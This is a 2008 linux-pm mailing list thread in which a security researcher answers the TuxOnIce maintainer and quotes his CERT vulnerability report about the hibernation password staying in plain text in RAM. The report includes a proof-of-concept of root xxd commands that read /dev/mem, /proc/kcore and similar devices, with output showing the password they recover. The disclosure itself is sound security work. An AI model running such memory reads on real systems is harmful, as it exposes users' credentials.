From: Jonathan Brossard <jonathan@iviztechnosolutions.com>
Subject: Re: Vulnerability in Software Suspend 2 (all versions)
Date: Mon, 28 Jul 2008 14:20:27 +0530
Message-ID: <488D8853.7080907@iviztechnosolutions.com>
References: <488D821D.5060603@iviztechnosolutions.com>	
	<488D8449.2010006@iviztechnosolutions.com>
	<1217234901.8430.115.camel@nigel-laptop>
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Return-path: <linux-pm-bounces@lists.linux-foundation.org>
In-Reply-To: <1217234901.8430.115.camel@nigel-laptop>
List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
List-Archive: <http://lists.linux-foundation.org/pipermail/linux-pm>
List-Post: <mailto:linux-pm@lists.linux-foundation.org>
List-Help: <mailto:linux-pm-request@lists.linux-foundation.org?subject=help>
List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
Sender: linux-pm-bounces@lists.linux-foundation.org
Errors-To: linux-pm-bounces@lists.linux-foundation.org
To: Nigel Cunningham <ncunningham@crca.org.au>
Cc: ncunningham@users.sourceforge.net, chabaud@users.sourceforge.net, bernardb@users.sourceforge.net, seasons@users.sourceforge.net, techteam@ivizindia.com, "CERT(R) Coordination Center" <cert@cert.org>, mhfl@users.sourceforge.net, linux-pm <linux-pm@lists.linux-foundation.org>, Jonathan Brossard <jonathan@ivizindia.com>
List-Id: linux-pm@vger.kernel.org

Dear Nigel,

>This is not a bug in TuxOnIce (or for that matter other Linux
>hibernation implementations, which would have the same issue).

Yes it is.

>TuxOnIce has no way to know what running applications have passwords
>stored in memory or whether they are storing them in an encrypted format
>or not. Bugs should be filed against applications that are storing
>passwords in plain text.


We are talking about the password of tuxonice itself here...

Please boot a computer using tuxonice, go for hibernation,
reboot, and then type this (as root) :

xxd -l 32 -s 0x041e  /dev/mem


>By the way, these contact email addresses are grossly out of date. For
>TuxOnIce, the contact is nigel@tuxonice.net. For swsusp and uswsusp
>(which would have the same problem), refer to linux-pm@lists.osdl.org.


I did my best to find one on the site's website and ended up
taking those of sourceforge.

Best regards,

Jonathan-


Nigel Cunningham wrote:
> Hi.
>
> This is not a bug in TuxOnIce (or for that matter other Linux
> hibernation implementations, which would have the same issue).
>
> TuxOnIce has no way to know what running applications have passwords
> stored in memory or whether they are storing them in an encrypted format
> or not. Bugs should be filed against applications that are storing
> passwords in plain text.
>
> By the way, these contact email addresses are grossly out of date. For
> TuxOnIce, the contact is nigel@tuxonice.net. For swsusp and uswsusp
> (which would have the same problem), refer to linux-pm@lists.osdl.org.
>
> Regards,
>
> Nigel
>
> On Mon, 2008-07-28 at 14:03 +0530, Jonathan Brossard wrote:
>   
>> Version 1.0
>> October 1996
>>             CERT(R) Coordination Center
>>         Product Vulnerability Reporting Form
>>
>>     If you know of a vulnerability in a product, please complete
>>     this form and return it to cert@cert.org.  We aren't able to
>>     acknowledge each report we receive; however, if we have additional
>>     questions, we will contact you for further information.
>>
>>         We prefer that any vulnerability information you
>>           send to us be encrypted. We can support a shared DES
>>       key or PGP. Contact the CERT staff for more information.
>>       The CERT PGP public key is available in
>>
>>                  http://www.cert.org/pgp/cert_pgp_key.asc
>>
>>     Thanks, we appreciate your taking the time to report this
>>     vulnerability.
>>
>>
>>
>>
>> CONTACT INFORMATION
>> ===============================================================================
>> Let us know who you are:
>>
>>  Name            : Jonathan Brossard
>>  E-mail            : jonathan@ivizindia.com
>>  Phone / fax        : +91-33-23242212
>>  Affiliation and address: iViZ Technosolutions Pvt. Ltd., Kolkata, 
>> India. http://www.ivizindia.com
>>
>>
>> Have you reported this to the vendor?  [yes]
>>
>>         If so, please let us know whom you've contacted:
>>
>>     Date of your report    : Mon Jul 28 13:57:44 IST 2008
>>     Vendor contact name    :
>>     Vendor contact phone    :
>>     Vendor contact e-mail    : bernardb@users.sourceforge.net 
>> chabaud@users.sourceforge.net ncunningham@users.sourceforge.net
>>     Vendor reference number    :
>>
>>
>>         If not, we encourage you to do so--vendors need to hear about
>>     vulnerabilities from you as a customer.
>>
>>
>> POLICY INFO
>> ===============================================================================
>> We encourage communication between vendors and their customers.  When
>> we forward a report to the vendor, we include the reporter's name and
>> contact information unless you let us know otherwise.
>>
>> If you want this report to remain anonymous, please check here:
>>
>>     ___ Do not release my identity to your vendor contact.
>>
>>
>> TECHNICAL INFO
>> ===============================================================================
>> If there is a CERT Vulnerability tracking number please put it
>> here (otherwise leave blank): VU#______.
>>
>>
>> Please describe the vulnerability.
>> - ----------------------------------
>>
>> The Linux kernel patch "Tux on ice" (previously called "software suspend 2")
>> fails to sanitize the memory area where user input,
>> in particular passwords are read. Therefore, the passwords remain in
>> plain text in RAM, after successfull restauration of the hibernated 
>> machine's
>> state.
>>
>>
>> What is the impact of this vulnerability?
>> - -----------------------------------------
>>  (For example: local user can gain root/privileged access, intruders
>>   can create root-owned files, denial of service attack,  etc.)
>>
>>    a) What is the specific impact:
>>
>> Plain text password disclosure of the authentication password.
>>
>>    b) How would you envision it being used in an attack scenario:
>>
>> The attacker can use this password to reboot the computer, possibly
>> to gain more privileges.
>>
>> To your knowledge is the vulnerability currently being exploited?
>> - -----------------------------------------------------------------
>>     [no]
>>
>> If there is an exploitation script available, please include it here.
>> - ---------------------------------------------------------------------
>>
>> Just pick up one (trivial) exploit below :
>>
>> root@blackbox:~# xxd -l 32 -s 0x041e  /dev/mem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x41e /dev/oldmem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x041e /dev/.static/dev/mem
>> 000041e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000042e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e  /proc/kcore
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e /dev/core
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~# xxd -l 32 -s 0x141e /dev/.static/dev/core
>> 000141e: 7019 3405 731f 731f 7711 300b 7213 6420  p.4.s.s.w.0.r.d
>> 000142e: 0d1c 0d1c 0000 0000 0000 0000 0000 0000  ................
>> root@blackbox:~#
>>
>>
>>
>> Do you know what systems and/or configurations are vulnerable?
>> - --------------------------------------------------------------
>>     [yes/no]  (If yes, please list them below)
>>
>>     All versions.
>>
>>
>> Are you aware of any workarounds and/or fixes for this vulnerability?
>> - ---------------------------------------------------------------------
>>     [yes]
>>
>> I provided a kernel patch to the owners of the project.
>>
>> OTHER INFORMATION
>> ===========================================================================
>> Is there anything else you would like to tell us?
>>
>>  You can indeed get back to us if you need more details :)
>>
>>
>> - --------
>> CERT and CERT Coordination Center are registered in the U.S. Patent and 
>> Trademark office.
>>
>>     
>
>
>   


-- 
    Jonathan Brossard
    Security Research Engineer
    iViZ Techno Solutions Pvt. Ltd.
    Mobile: +91-9748772994

    Kolkata:
    iViZ Technolgy Solutions(P) Ltd
    c/o Erevmax Technologies (P) Ltd
    DLF IT Park,
    Tower-1, 12th Floor
    08 Major Arterial Road
    New Town, Rajarhat
    Kolkata- 700 156

    Kharagpur:
    iViZ Techno Solutions Pvt Ltd,
    School of Information Technology,
    Indian Institute of Technology,
    2nd Floor, Takshashila,
    Kharagpur 721302 West Bengal, India.
    Phone: +91-3222-282300 ext 4324

    Web page: http://www.ivizindia.com
